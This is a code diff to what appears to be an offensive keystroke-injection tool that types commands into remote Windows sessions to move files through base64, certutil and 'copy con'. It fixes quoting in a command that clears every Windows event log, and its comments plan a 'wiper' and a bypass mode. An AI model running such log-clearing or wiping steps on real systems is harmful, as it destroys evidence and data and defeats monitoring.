@@ -140,6 +140,10 @@ function OutputRemoteFile {
     local method=$4
 
     # TODO: Implement bin2hex method
+    # one line HEX value without spaces , columns ,addresses (either echo or tee to logging by appending)
+
+    # C:\> certutil -f -encodehex scan.bat hex_type_12.hex 12
+
     case $method in
         "" | pwshb64)
             Base64 "$local_file" "$remote_file" "$platform" "powershell"
@@ -176,6 +180,9 @@ function Base64 {
     local random2=$(random_string)
 
     # TODO: Implement encryption method through base64 with -b,--bypass flag
+    # iconv -t UTF-16LE file.txt | gzip -c | openssl enc -a -e -A
+    # gzip -c file.exe | openssl enc -a -e -A
+    
     # Check if input is passed as file
     if [[ -f "$input" && ("$platform" = "windows" || "$platform" = "linux") && "$mode" = "powershell" ]]
     then
@@ -211,6 +218,15 @@ EOF
         done <<< "$base64_data"
         print_status "completed" "File transferred!"
     fi
+}
+
+function Bin2Hex {
+    local input=$1
+    local output_file=$2
+    local platform=$3
+    local mode=$4
+    
+    echo "Not implemented"
 }
 
 function PowershellOutFile {
@@ -277,6 +293,14 @@ function PowershellOutFile {
             xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
 
             xdotool_return_input "Remove-Item -Force ${random_temp}.txt" "return"
+        elif [ "$mode" = "hex" ]
+        then
+            # in columns with spaces , without the characters and the addresses (can be used with copycon and outfile)
+
+            # C:\> certutil -f -encodehex scan.bat hex_type_4.hex 4
+            # Sample output:
+            # 40 65 63 68 6f 20 6f 66  66 0d 0a 73 65 74 20 22
+            echo "Not implemented"
         fi
     fi
 
@@ -317,7 +341,6 @@ function CopyCon {
         print_status "progress" "Transferring file..."
         xdotool_return_input "copy con $output_file" "return"
 
-        # TODO: Test it to ensure it's functional
         line_count=$(wc -l < "$input")
         counter=1
         while read -r line
@@ -353,6 +376,14 @@ function CopyCon {
         xdotool_return_input "-----END CERTIFICATE-----" "copycon"
         xdotool_return_input "CertUtil.exe -decode ${random_temp}.txt $output_file" "return"
         xdotool_return_input "del /f ${random_temp}.txt" "return"
+    elif [ "$mode" = "hex" ]
+    then
+        # in columns with spaces , without the characters and the addresses (can be used with copycon and outfile)
+
+        # C:\> certutil -f -encodehex scan.bat hex_type_4.hex 4
+        # Sample output:
+        # 40 65 63 68 6f 20 6f 66  66 0d 0a 73 65 74 20 22
+        echo "Not implemented"
     fi
 
     print_status "completed" "File transferred!"
@@ -586,7 +617,7 @@ EOF
         echo "$description"
     elif [ "$mode" = "execute" ]
     then
-        Execute "for /f "tokens=*" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
+        Execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
     elif [ "$mode" = "script" ]
     then
     # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
